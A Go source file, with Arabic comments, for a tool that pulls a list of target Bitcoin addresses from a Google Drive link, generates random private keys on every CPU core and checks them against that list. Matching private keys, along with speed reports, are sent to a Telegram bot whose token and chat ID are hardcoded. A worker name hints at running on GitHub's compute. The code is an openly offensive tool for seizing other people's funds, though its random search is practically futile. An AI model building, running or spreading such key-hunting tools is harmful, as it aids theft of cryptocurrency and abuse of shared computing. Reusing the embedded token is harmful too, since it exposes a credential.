package main

import (
	"bufio"
	"crypto/sha256"
	"fmt"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/btcsuite/btcd/btcutil/base58"
	"golang.org/x/crypto/ripemd160"
)

var (
	totalChecked uint64
	startTime    = time.Now()
	token        = "5921618897:AAGu6bp5gFtatio22y-XdWUSwAd0Lk6b1HY"
	chatID       = "227172927"
	fileURL      = "https://drive.google.com/uc?export=download&id=1WGGjb1WQ6kkeA1x_2eQo-uecYg8RXLDb"
	workerName   = "GitHub-Worker"
)

// دالة تحويل المفتاح العام إلى عنوان 1...
func hash160(data []byte) []byte {
	h256 := sha256.Sum256(data)
	hasher := ripemd160.New()
	hasher.Write(h256[:])
	return hasher.Sum(nil)
}

func encodeAddress(pubKey []byte) string {
	return base58.CheckEncode(hash160(pubKey), 0x00)
}

func main() {
	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)

	fmt.Println("🚀 جاري تحميل الأهداف...")
	resp, err := http.Get(fileURL)
	if err != nil { return }
	defer resp.Body.Close()

	targets := make(map[string]bool)
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		addr := strings.TrimSpace(scanner.Text())
		if addr != "" { targets[addr] = true }
	}
	fmt.Printf("✅ تم شحن %d هدف. انطلقنا!\n", len(targets))

	go func() {
		for {
			time.Sleep(5 * time.Minute)
			sendReport()
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < cores*16; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				priv, _ := btcec.NewPrivateKey()
				// فحص النوعين الأساسيين (Compressed & Uncompressed)
				a1 := encodeAddress(priv.PubKey().SerializeCompressed())
				a2 := encodeAddress(priv.PubKey().SerializeUncompressed())

				if targets[a1] || targets[a2] {
					sendFound(a1, priv)
				}
				atomic.AddUint64(&totalChecked, 1)
			}
		}()
	}
	wg.Wait()
}

func sendReport() {
	elapsed := time.Since(startTime).Seconds()
	speed := float64(atomic.LoadUint64(&totalChecked)) / elapsed
	report := fmt.Sprintf("🤖 [%s]\n🚀 السرعة: %.0f/ث\n💎 الإجمالي: %d", workerName, speed, atomic.LoadUint64(&totalChecked))
	sendTelegram(report)
}

func sendTelegram(text string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", token, chatID, url.QueryEscape(text))
	http.Get(apiURL)
}

func sendFound(addr string, priv *btcec.PrivateKey) {
	msg := fmt.Sprintf("💰 FOUND!\nAddr: %s\nKey: %x", addr, priv.Serialize())
	sendTelegram(msg)
}
